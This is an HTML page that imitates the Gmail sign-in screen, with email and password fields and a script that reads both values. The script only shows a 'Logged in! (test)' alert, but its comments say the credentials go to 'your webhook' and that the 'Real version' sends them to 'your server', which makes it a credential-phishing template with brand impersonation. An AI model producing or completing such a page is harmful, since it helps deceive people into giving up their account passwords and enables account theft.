<!DOCTYPE html>  
<html>  
<head>  
<title>Gmail</title>  
<style>  
body {font-family: Arial; background: #f1f1f1; text-align: center;}  
.container {width: 300px; margin: 100px auto; background: white; padding: 20px; border: 1px solid #ddd;}  
input {width: 100%; padding: 10px; margin: 10px 0;}  
button {background: #1a73e8; color: white; padding: 10px; width: 100%; border: none;}  
</style>  
</head>  
<body>  
<div class="container">  
<h2>Sign in</h2>  
<p>to continue to Gmail</p>  
<input type="email" placeholder="Email or phone" id="email">  
<input type="password" placeholder="Password" id="pass">  
<button onclick="fakeLogin()">Next</button>  
</div>  
  
<script>  
function fakeLogin() {  
  var email = document.getElementById('email').value;  
  var pass = document.getElementById('pass').value;  
  // Send to your webhook or whatever  
  alert("Logged in! (test)");  
  // Real version: fetch to your server with creds  
}  
</script>  
</body>  
</html>   
